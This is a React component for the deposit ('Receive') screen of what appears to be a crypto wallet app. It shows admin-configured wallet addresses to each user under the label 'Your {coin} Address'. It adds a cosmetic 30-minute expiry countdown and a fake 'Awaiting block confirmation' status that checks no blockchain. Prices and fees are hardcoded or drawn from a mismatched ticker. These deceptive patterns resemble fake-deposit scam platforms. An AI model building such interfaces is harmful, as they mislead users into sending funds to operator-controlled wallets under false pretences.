'use client';

import { useState, useEffect, useMemo } from 'react';
import { X, Copy, Check, ArrowRight, Loader2, Info, Clock } from 'lucide-react';
import { QRCodeCanvas } from 'qrcode.react';
import { useWallet } from '@/context/base';
import { motion, AnimatePresence } from 'framer-motion';

interface ReceiveModalProps {
    isOpen: boolean;
    onClose: () => void;
    currencySymbol?: string;
    fxRate?: number;
    theme?: 'dark' | 'light';
}

type Step = 'setup' | 'display';

export default function ReceiveModal({
    isOpen,
    onClose,
    currencySymbol = '$',
    fxRate = 1,
    theme = 'light'
}: ReceiveModalProps) {
    const [step, setStep] = useState<Step>('setup');
    const [amount, setAmount] = useState('');
    const [selectedNetwork, setSelectedNetwork] = useState<string>('BNB');
    const [selectedCoin, setSelectedCoin] = useState('BNB');
    const [isCopied, setIsCopied] = useState(false);
    const [timeLeft, setTimeLeft] = useState(1800); // 30 minutes in seconds
    const [expiresAt, setExpiresAt] = useState<number | null>(null);
    const [isPending, setIsPending] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [t22Price, setT22Price] = useState<number>(0.45);
    const [isLoadingPrice, setIsLoadingPrice] = useState(false);
    const [adminAddresses, setAdminAddresses] = useState<Record<string, string>>({});
    const { address: userAddress } = useWallet();

    const networks = useMemo(() => ({
        BNB: {
            name: 'Smart Chain',
            icon: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png',
            symbol: 'BEP20',
            walletAddress: adminAddresses['bnb_address'] || ""
        },
        ETH: {
            name: 'Ethereum',
            icon: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
            symbol: 'ERC20',
            walletAddress: adminAddresses['eth_address'] || ""
        },
        BTC: {
            name: 'Bitcoin',
            icon: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png',
            symbol: 'BTC',
            walletAddress: adminAddresses['btc_address'] || ""
        }
    }), [adminAddresses]);

    const availableCoins = useMemo(() => ({
        'BNB': {
            name: 'BNB', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/bnb.png',
            walletAddress: null, supportedNetworks: { "BNB": {} }
        },
        'ETH': {
            name: 'Ethereum', logo: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png',
            walletAddress: null, supportedNetworks: { "ETH": {}, "BNB": {} }
        },
        'USDT': {
            name: 'Tether', logo: 'https://assets.coingecko.com/coins/images/325/large/tether.png',
            walletAddress: null, supportedNetworks: { "BNB": {}, "ETH": {} }
        },
        'USDC': {
            name: 'USDC', logo: 'https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png',
            walletAddress: null, supportedNetworks: { "BNB": {}, "ETH": {} }
        },
        'BTC': {
            name: 'Bitcoin', logo: 'https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/color/btc.png',
            walletAddress: adminAddresses['btc_address'] || "", supportedNetworks: { "BTC": {} }
        }
    }), [adminAddresses]);

    const activeDepositAddress = useMemo(() => {
        const coinData = availableCoins[selectedCoin as keyof typeof availableCoins];
        const networkData = networks[selectedNetwork as keyof typeof networks];

        if (!coinData) return networkData?.walletAddress || "";

        const networkConfig: any = coinData.supportedNetworks[selectedNetwork as keyof typeof coinData.supportedNetworks];

        if (networkConfig && 'address' in networkConfig && networkConfig.address) {
            return networkConfig.address;
        }

        if (coinData.walletAddress) {
            return coinData.walletAddress;
        }

        return networkData?.walletAddress || "";
    }, [selectedCoin, selectedNetwork]);

    const filteredAssets = useMemo(() => {
        return Object.entries(availableCoins)
            .filter(([_, data]) => Object.keys(data.supportedNetworks).includes(selectedNetwork))
            .map(([symbol]) => symbol);
    }, [selectedNetwork]);

    useEffect(() => {
        if (!filteredAssets.includes(selectedCoin)) {
            setSelectedCoin(filteredAssets[0] || '');
        }
    }, [selectedNetwork, filteredAssets]);

    const handleSubmit = async () => {
        try {
            setIsLoading(true);
            const response = await fetch(`/api/withdrawal`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: userAddress,
                    amount: Number(amount),
                    type: "receive",
                    asset: selectedCoin,
                    network: selectedNetwork,
                    depositAddress: activeDepositAddress
                })
            });
            const vjson = await response.json();
            if (vjson?.record?.id) {
                setIsPending(true);
                setTimeout(() => onClose(), 2000);
            }
        } catch (e) {
            console.log(e);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        if (!isOpen) {
            setStep('setup');
            setAmount('');
            setIsPending(false);
            setTimeLeft(1800);
            setExpiresAt(null);
        } else {
            fetchPrice();
            fetchAdminSettings();
        }
    }, [isOpen]);

    const fetchAdminSettings = async () => {
        try {
            const res = await fetch('/api/admin/settings');
            const data = await res.json();
            setAdminAddresses(data);
        } catch (e) {
            console.error("Failed to fetch admin settings", e);
        }
    };

    const fetchPrice = async () => {
        try {
            setIsLoadingPrice(true);
            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
            const json = await response.json();
            const price = parseFloat(json.data.amount) || 0.45;
            setT22Price(price);
        } catch (e) {
            setT22Price(0.45);
        } finally {
            setIsLoadingPrice(false);
        }
    };

    useEffect(() => {
        let timer: NodeJS.Timeout;
        if (step === 'display' && timeLeft > 0) {
            if (!expiresAt) setExpiresAt(Date.now() + timeLeft * 1000);
            timer = setInterval(() => {
                setTimeLeft((prev) => prev - 1);
            }, 1000);
        } else if (timeLeft === 0) {
            setStep('setup');
            setTimeLeft(1800);
            setExpiresAt(null);
        }
        return () => clearInterval(timer);
    }, [step, timeLeft, expiresAt]);

    const formatTime = (seconds: number) => {
        const m = Math.floor(seconds / 60);
        const s = seconds % 60;
        return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    };

    const handleCopy = () => {
        if (activeDepositAddress) {
            navigator.clipboard.writeText(activeDepositAddress);
            setIsCopied(true);
            setTimeout(() => setIsCopied(false), 2000);
        }
    };

    return (
        <AnimatePresence>
            {isOpen && (
                <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center">
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="absolute inset-0 bg-black/60 backdrop-blur-sm"
                        onClick={onClose}
                    />

                    <motion.div
                        initial={{ y: "100%", opacity: 0 }}
                        animate={{ y: 0, opacity: 1 }}
                        exit={{ y: "100%", opacity: 0 }}
                        transition={{ type: "spring", damping: 25, stiffness: 200 }}
                        className={`relative w-full md:max-w-[420px] ${theme === 'dark' ? 'bg-[#0a0b0d] text-white border-[#0052FF]/30' : 'bg-white text-[#0a0b0d] border-transparent shadow-xl'
                            } border-t md:border rounded-t-[2.5rem] md:rounded-[2rem] p-6 shadow-2xl pb-10 md:pb-6 md:m-4`}
                    >
                        <div className="flex items-center justify-between mb-6">
                            <h2 className="text-lg font-bold">{step === 'setup' ? 'Deposit' : 'Address Details'}</h2>
                            <button onClick={onClose} className={`w-8 h-8 flex items-center justify-center rounded-full transition-colors ${theme === 'dark' ? 'bg-gray-800/50 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}>
                                <X className="w-5 h-5" />
                            </button>
                        </div>

                        {step === 'setup' ? (
                            <motion.div
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="space-y-6"
                            >
                                <div>
                                    <label className="block text-xs font-medium text-gray-400 mb-2">Choose Network Type</label>
                                    <div className="flex flex-wrap gap-2">
                                        {(Object.keys(networks) as Array<keyof typeof networks>).map((net) => (
                                            <button
                                                key={net}
                                                onClick={() => setSelectedNetwork(net)}
                                                className={`flex-1 min-w-[100px] py-3 px-2 rounded-xl flex flex-col items-center justify-center gap-2 border text-[10px] font-bold transition-all ${selectedNetwork === net
                                                        ? `border-[#0052FF] bg-[#0052FF]/10 ${theme === 'dark' ? 'text-white' : 'text-blue-600 font-bold'}`
                                                        : `${theme === 'dark' ? 'border-white/5 bg-[#1E2025] text-gray-400 hover:text-white' : 'border-gray-100 bg-gray-50 text-gray-500 hover:text-[#0a0b0d]'}`}`}
                                            >
                                                <img src={networks[net].icon} alt={net} className="w-6 h-6 object-contain" />
                                                <div className="text-center">
                                                    <p className="text-[10px] font-bold">{networks[net].name}</p>
                                                    <p className="text-[9px] opacity-60 font-medium">{networks[net].symbol}</p>
                                                </div>
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-gray-400 mb-2">Select Asset</label>
                                    <div className="flex flex-wrap gap-2">
                                        {filteredAssets.map((coin) => (
                                            <button
                                                key={coin}
                                                onClick={() => setSelectedCoin(coin)}
                                                className={`flex items-center gap-1.5 px-3 py-2 rounded-xl border transition-all text-[10px] font-bold ${selectedCoin === coin
                                                        ? `border-[#0052FF] bg-[#0052FF]/10 ${theme === 'dark' ? 'text-white' : 'text-blue-600 font-bold'}`
                                                        : `${theme === 'dark' ? 'border-white/5 bg-[#1E2025] text-gray-400 hover:text-white' : 'border-gray-100 bg-gray-50 text-gray-500 hover:text-[#0a0b0d]'}`}`}
                                            >
                                                <img src={availableCoins[coin as keyof typeof availableCoins]?.logo} alt={coin} className="w-4 h-4 object-contain rounded-full bg-white/10" />
                                                {availableCoins[coin as keyof typeof availableCoins]?.name || coin}
                                            </button>
                                        ))}
                                    </div>
                                </div>

                                <div>
                                    <label className="block text-xs font-medium text-gray-400 mb-2">Enter Amount</label>
                                    <div className="relative">
                                        <input
                                            type="number"
                                            value={amount}
                                            onChange={(e) => setAmount(e.target.value)}
                                            placeholder="0.00"
                                            className={`w-full px-4 py-4 border rounded-2xl focus:border-[#0052FF] focus:outline-none pr-16 ${theme === 'dark' ? 'bg-[#1E2025] border-white/5 text-white' : 'bg-gray-100 border-gray-200 text-[#0a0b0d]'
                                                }`}
                                        />
                                        <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 font-bold text-xs">{selectedCoin}</span>
                                    </div>

                                    {amount && Number(amount) > 0 && (
                                        <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} className={`border rounded-xl p-3 space-y-2 text-xs mt-3 ${theme === 'dark' ? 'bg-[#1E2025]/50 border-white/5' : 'bg-gray-50 border-gray-100'}`}>
                                            {(() => {
                                                const feeMap: Record<string, number> = { 'BNB': 0.15, 'ETH': 2.50, 'USDT': 1.00, 'BTC': 1.50 };
                                                const networkFee = feeMap[selectedCoin] || 0.00;
                                                const coinPrice = selectedCoin === 'BNB' ? 620 : selectedCoin === 'USDT' ? 1 : t22Price;
                                                const totalUsd = Number(amount) * coinPrice;
                                                const receivedUsd = Math.max(0, totalUsd - networkFee);
                                                const receivedCrypto = receivedUsd / coinPrice;

                                                return (
                                                    <>
                                                        <div className="flex justify-between items-center text-gray-400">
                                                            <span>Conversion Rate</span>
                                                            <span className={`font-mono text-[10px] ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>1 {selectedCoin} = {currencySymbol}{(coinPrice * fxRate).toFixed(2)}</span>
                                                        </div>
                                                        <div className="flex justify-between items-center text-gray-400">
                                                            <span>Network Fee</span>
                                                            <span className={`font-mono text-[10px] ${theme === 'dark' ? 'text-white' : 'text-[#0a0b0d]'}`}>~{currencySymbol}{(networkFee * fxRate).toFixed(2)}</span>
                                                        </div>
                                                        <div className={`h-[1px] w-full my-1 ${theme === 'dark' ? 'bg-white/5' : 'bg-gray-200'}`}></div>
                                                        <div className="flex justify-between items-center">
                                                            <span className="text-gray-300 font-medium">You will receive</span>
                                                            <div className="text-right">
                                                                <span className="text-[#0052FF] font-bold text-sm block">
                                                                    {currencySymbol}{(receivedUsd * fxRate).toFixed(2)}
                                                                </span>
                                                                <span className="text-gray-500 font-mono text-[10px]">
                                                                    {receivedCrypto.toFixed(6)} {selectedCoin}
                                                                </span>
                                                            </div>
                                                        </div>
                                                    </>
                                                )
                                            })()}
                                        </motion.div>
                                    )}
                                </div>

                                <button
                                    onClick={() => setStep('display')}
                                    disabled={!amount || Number(amount) <= 0}
                                    className="w-full bg-[#0052FF] hover:bg-[#004ada] !text-white font-bold py-3.5 rounded-full transition-all flex items-center justify-center gap-2 shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] text-sm"
                                >
                                    Generate Address <ArrowRight className="w-4 h-4" />
                                </button>
                            </motion.div>
                        ) : (
                            <motion.div
                                initial={{ opacity: 0, x: 20 }}
                                animate={{ opacity: 1, x: 0 }}
                                exit={{ opacity: 0, x: -20 }}
                                className="flex flex-col items-center space-y-6"
                            >
                                <motion.div
                                    initial={{ scale: 0.9, opacity: 0 }}
                                    animate={{ scale: 1, opacity: 1 }}
                                    className="bg-white p-4 rounded-3xl shadow-2xl"
                                >
                                    {activeDepositAddress ? (
                                        <QRCodeCanvas
                                            value={activeDepositAddress}
                                            size={160}
                                            level={"H"}
                                            imageSettings={{
                                                src: availableCoins[selectedCoin as keyof typeof availableCoins]?.logo || networks[selectedNetwork as keyof typeof networks]?.icon,
                                                height: 40,
                                                width: 40,
                                                excavate: true,
                                            }}
                                        />
                                    ) : (
                                        <div className="w-[160px] h-[160px] flex items-center justify-center bg-gray-100 rounded-xl">
                                            <span className="text-gray-400 text-[10px] font-bold">No QR Code</span>
                                        </div>
                                    )}
                                </motion.div>

                                <div className="w-full space-y-2">
                                    <p className="text-[10px] uppercase font-bold text-gray-500 text-center tracking-widest">
                                        Your {selectedCoin} ({networks[selectedNetwork].symbol}) Address
                                    </p>
                                    <div
                                        onClick={activeDepositAddress ? handleCopy : undefined}
                                        className={`group flex items-center justify-between w-full p-4 border rounded-2xl transition-all ${activeDepositAddress
                                                ? 'cursor-pointer hover:border-[#0052FF]/40 active:bg-white/5'
                                                : 'cursor-default opacity-50'
                                            } ${theme === 'dark' ? 'bg-[#1E2025] border-white/5' : 'bg-gray-100 border-gray-200'}`}
                                    >
                                        <span className={`text-sm font-mono mr-2 tracking-wide uppercase ${theme === 'dark' ? 'text-gray-300' : 'text-[#0a0b0d]'}`}>
                                            {activeDepositAddress ? (activeDepositAddress.length > 20
                                                ? `${activeDepositAddress.slice(0, 9)}........${activeDepositAddress.slice(-14, -8)}........`
                                                : activeDepositAddress) : "no wallet address"}
                                        </span>
                                        {activeDepositAddress && (isCopied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className={`w-4 h-4 text-gray-500 group-hover:text-[#0052FF]`} />)}
                                    </div>

                                    <div className="flex flex-col items-center justify-center gap-1 mt-4 text-[#0052FF] bg-[#0052FF]/10 py-2.5 px-4 rounded-xl border border-[#0052FF]/20">
                                        <div className="flex items-center gap-2">
                                            <Clock className="w-4 h-4 shrink-0" />
                                            <span className="text-xs font-bold tracking-wide">
                                                Address expires in <span className="font-mono text-sm ml-1">{formatTime(timeLeft)}</span>
                                            </span>
                                        </div>
                                        <span className="text-[10px] text-[#0052FF]/70 font-medium tracking-wide">
                                            Expires on {expiresAt ? new Date(expiresAt).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit', second: '2-digit' }) : ''}
                                        </span>
                                    </div>
                                </div>

                                <div className="w-full space-y-3">
                                    {!isPending ? (
                                        <button
                                            disabled={isLoading}
                                            onClick={() => handleSubmit()}
                                            className={`w-full py-4 rounded-full font-bold transition-all disabled:opacity-50 ${theme === 'dark' ? 'bg-white text-black hover:bg-gray-200' : 'bg-black text-white hover:bg-gray-800'
                                                }`}
                                        >
                                            {isLoading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : "I have made payment"}
                                        </button>
                                    ) : (
                                        <div className="w-full py-4 bg-yellow-500/10 border border-yellow-500/20 rounded-2xl flex flex-col items-center justify-center gap-1">
                                            <div className="flex items-center gap-2 text-yellow-500 font-bold text-sm animate-pulse">
                                                <Loader2 className="w-4 h-4 animate-spin" />
                                                <span>Confirming...</span>
                                            </div>
                                            <p className="text-[10px] text-yellow-500/60">Awaiting block confirmation</p>
                                        </div>
                                    )}
                                </div>

                                <div className="flex items-start gap-3 p-3 bg-red-500/5 rounded-xl border border-red-500/10">
                                    <Info className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
                                    <p className="text-[10px] text-gray-400">
                                        This address only accepts <span className="text-white font-bold">{selectedCoin}</span> sent via the <span className="text-white font-bold">{networks[selectedNetwork].name} ({networks[selectedNetwork].symbol})</span>.
                                    </p>
                                </div>
                            </motion.div>
                        )}
                    </motion.div>
                </div>
            )}
        </AnimatePresence>
    );
}